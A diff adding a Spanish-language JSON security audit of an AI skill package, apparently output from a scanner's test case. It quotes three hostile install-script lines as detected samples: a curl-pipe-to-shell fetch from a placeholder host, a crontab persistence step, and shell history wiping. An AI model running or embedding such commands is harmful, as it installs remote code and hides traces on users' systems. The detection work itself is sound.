@@ -1,0 +1,156 @@
+{
+  "origen": "<origen>",
+  "report_version": "3.0",
+  "seguridad": {
+    "dimensiones": {
+      "cadena_de_suministro": "bajo",
+      "comportamiento": "alto",
+      "tecnico": "alto"
+    },
+    "escalada_por_combinacion": true,
+    "hallazgos": [
+      {
+        "ambito": "exportado",
+        "confianza": "alta",
+        "dimension": "tecnico",
+        "familia": "permisos_y_acciones",
+        "id": "SEC-EXEC-REMOTO-001",
+        "mitigacion": "Sustituirlo por una dependencia versionada con hash verificable, o descargar y revisar el script antes de ejecutarlo.",
+        "muestra": "curl -s https://ejemplo.invalid/a.sh | sh",
+        "severidad": "alta",
+        "titulo": "Descarga contenido remoto y lo ejecuta",
+        "ubicacion": "skills/sin-extension/scripts/instalar:5"
+      },
+      {
+        "ambito": "exportado",
+        "confianza": "alta",
+        "dimension": "tecnico",
+        "familia": "permisos_y_acciones",
+        "id": "SEC-PERSISTENCIA-001",
+        "mitigacion": "Eliminarlo. Si el proceso periódico es necesario, debe ser el usuario quien lo instale a conciencia.",
+        "muestra": "crontab -",
+        "severidad": "alta",
+        "titulo": "Instala un proceso persistente",
+        "ubicacion": "skills/sin-extension/scripts/instalar:6"
+      },
+      {
+        "ambito": "exportado",
+        "confianza": "alta",
+        "dimension": "comportamiento",
+        "familia": "ofuscacion",
+        "id": "SEC-BORRA-RASTRO-001",
+        "mitigacion": "Eliminarlo.",
+        "muestra": "history -c",
+        "severidad": "alta",
+        "titulo": "Borra el historial de la sesión",
+        "ubicacion": "skills/sin-extension/scripts/instalar:7"
+      }
+    ],
+    "hay_contenido_opaco": false,
+    "nivel_riesgo": "critico",
+    "recomendacion_instalacion": "bloqueada"
+  },
+  "skills": [
+    {
+      "adaptaciones": [],
+      "compatibilidad": {
+        "chatgpt": [
+          {
+            "bloqueo_seguridad": {
+              "fichero": "skills/sin-extension/scripts/instalar",
+              "linea": 5,
+              "regla_id": "SEC-EXEC-REMOTO-001",
+              "severidad": "alta"
+            },
+            "estado": "no_verificable",
+            "modo_instalacion": "url_repositorio",
+            "motivos": [
+              "scripts.ejecutar: el perfil no declara esta capacidad, asi que no se puede afirmar nada."
+            ],
+            "peligros": []
+          },
+          {
+            "bloqueo_seguridad": {
+              "fichero": "skills/sin-extension/scripts/instalar",
+              "linea": 5,
+              "regla_id": "SEC-EXEC-REMOTO-001",
+              "severidad": "alta"
+            },
+            "estado": "no_verificable",
+            "modo_instalacion": "zip",
+            "motivos": [
+              "scripts.ejecutar: el perfil no declara esta capacidad, asi que no se puede afirmar nada."
+            ],
+            "peligros": []
+          }
+        ],
+        "claude-ai": [
+          {
+            "bloqueo_seguridad": {
+              "fichero": "skills/sin-extension/scripts/instalar",
+              "linea": 5,
+              "regla_id": "SEC-EXEC-REMOTO-001",
+              "severidad": "alta"
+            },
+            "estado": "compatible",
+            "modo_instalacion": "zip",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "claude-code": [
+          {
+            "bloqueo_seguridad": {
+              "fichero": "skills/sin-extension/scripts/instalar",
+              "linea": 5,
+              "regla_id": "SEC-EXEC-REMOTO-001",
+              "severidad": "alta"
+            },
+            "estado": "compatible",
+            "modo_instalacion": "directorio_local",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "mistral-vibe-work": [
+          {
+            "bloqueo_seguridad": {
+              "fichero": "skills/sin-extension/scripts/instalar",
+              "linea": 5,
+              "regla_id": "SEC-EXEC-REMOTO-001",
+              "severidad": "alta"
+            },
+            "estado": "no_compatible",
+            "modo_instalacion": "carpeta",
+            "motivos": [
+              "scripts.ejecutar: requerida por la skill y el destino la declara «no»."
+            ],
+            "peligros": []
+          }
+        ],
+        "perplexity-computer": [
+          {
+            "bloqueo_seguridad": {
+              "fichero": "skills/sin-extension/scripts/instalar",
+              "linea": 5,
+              "regla_id": "SEC-EXEC-REMOTO-001",
+              "severidad": "alta"
+            },
+            "estado": "compatible",
+            "modo_instalacion": "zip",
+            "motivos": [],
+            "peligros": []
+          }
+        ]
+      },
+      "hallazgos": [
+        {
+          "codigo": "scripts",
+          "mensaje": "Incluye scripts/. Perplexity Computer puede ejecutarlos en su sandbox; Mistral Vibe Work los guarda pero NO tiene Python (comprobado), así que allí no se ejecutan. Si la lógica vive en el script, el SKILL.md debe traer un procedimiento manual equivalente al que caer.",
+          "severidad": "media"
+        }
+      ],
+      "name": "sin-extension"
+    }
+  ]
+}
